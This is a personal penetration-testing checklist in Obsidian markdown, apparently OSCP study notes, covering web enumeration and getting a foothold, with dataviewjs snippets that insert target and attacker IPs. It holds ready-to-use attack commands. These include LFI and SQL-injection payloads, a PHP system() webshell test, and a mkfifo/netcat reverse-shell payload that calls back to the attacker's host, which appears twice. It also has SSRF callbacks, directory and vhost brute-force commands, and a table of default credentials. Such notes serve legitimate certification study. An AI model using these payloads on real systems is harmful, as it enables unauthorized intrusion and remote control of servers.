## 2. Service Enumeration

### 🌐 Web (80/443)
> [!note]- Web Checklist
> - [ ] Visit site
> - [ ] View source
> - [ ] Identify tech/CMS
> - [ ] Test parameters (?id=1, ?page=)
> - [ ] Analyze error page
> - [ ] curl -i domain
>
> #### Brute Force
> - [ ] Directory brute force (common)
> - [ ] Directory brute force (big)
> - [ ] Vhost brute force
> - [ ] Feroxbuster File directories sweep
>
> #### Vulnerability Testing
> - [ ] LFI (../../../../etc/passwd)
> - [ ] SQLi (test' or 1=1;-- -) [[SQL Injection]]
> - [ ] Command Injection (; whoami)
> - [ ] PHP code inclusion
> - [ ] File upload (if available)
>
> #### Hidden Content
> - [ ] Check JS files
> - [ ] Check comments
> - [ ] Check backups (.bak, .zip)

#### If Found : Login Pages
> [!tip]- Admin Page
> 
> > #### Admin Login
> - [ ] Discover software version
> - [ ] Research about software
> - [ ] Search and Try Default credentials
> - [ ] Research CVEs related to version
>
> #### Registration
> - [ ] Register an account
> - [ ] Login using registered account
>
> #### User Login
> - [ ] Default credentials
> - [ ] 
>
> #### Reset Password (Email)
> - [ ] If invalid email = does not match our records, SQLi (test' or 1=1;-- -)  [[SQL Injection|link]]
>
> #### Admin Dashboards
> - [ ] Search for framework CVEs
> - [ ] Search for dependencies CVEs
> - [ ] File Uploads for PHP arbitrary code execution [[Arbitrary File Upload Vulnerability|link]]

#### If Found: .git
> [!tip]- Git Dump
> - [ ] Run git-dumper
> - [ ] Search for creds
> - [ ] Check commit history

#### If Found: wordpress
> [!tip]- Wordpress
> - [ ] Default creds
> - [ ] wpscan


---
## 2. Footholds

[[2. Footholds]]
### 80 Web

Web Testing
- [ ] Visit web address
- [ ] Try default credentials
- [ ] Test for php execution
- [ ] Test for Server Side Request Forgery (SSRF)
- [ ] If .git, GIT Dump

Brute Forcing
- [ ] Directory brute force (Big.txt)
- [ ] Directory brute force (Common.txt)
- [ ] Feroxbuster sweep through file directories
- [ ] Curl -i newfound directory
- [ ] Vhost brute force

---
Visit the web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
If find any domain names,

Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Use GoBuster to enumerate vhosts and directories

Directories
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `gobuster dir --url http://${discoveredDomain}/ --wordlist /usr/share/wordlists/dirb/big.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `gobuster dir --url http://${discoveredDomain}/ --wordlist /usr/share/wordlists/dirb/common.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `curl -i ${discoveredDomain}/[newfounddirectory]`;

dv.paragraph("```bash\n" + command + "\n```");
```
Error note : -b 301

Might find application powering the webserver

---

FEROXBUSTER Sweep through file directories
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `feroxbuster -u http://${discoveredDomain} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -t 80 -d 2`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

VHosts
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `sudo gobuster vhost -u http://${discoveredDomain}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`;

dv.paragraph("```bash\n" + command + "\n```");
```

Add newfound vhost to /etc/hosts
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

If admin login page is found,

Google for default credentials

| Service         | Version          | User  | Username | Password |
| --------------- | ---------------- | ----- | -------- | -------- |
| Dolibarr        | 17.0.0           | Admin | admin    | admin    |
| Jetty           | 9.4.39.v20210325 | Admin | admin    | admin    |
| Request Tracker | 4.4.4            | root  | root     | password |

---

Observe any suspicious error pages and conduct further research

Examples : 
1. Whitelabel Error Page > Sprint Boot Java Framework

---

Look for php code inclusion

Templates
Pages

Test for php execution
```
<?PHP echo system("whoami");?>
```

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]

---

If a form accepts URL, try Server Side Request Forgery (SSRF), 

```
nc -lvnp 5553
```

![[Pasted image 20260316194811.png]]

Send a request back to attacker Kali machine and see if capture anything

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `http://${KaliIP}:5553`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260316195540.png]]



---

If .git found, [[GIT dumper]]

Search for credentials

---

Observe any suspicious error pages and conduct further research

Examples : 
1. Whitelabel Error Page > Sprint Boot Java Framework

---

Look for php code inclusion

Templates
Pages

Test for php execution
```
<?PHP echo system("whoami");?>
```

---

Testing for SQL Injection

```
test' or 1=1;-- - 
```


---

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]
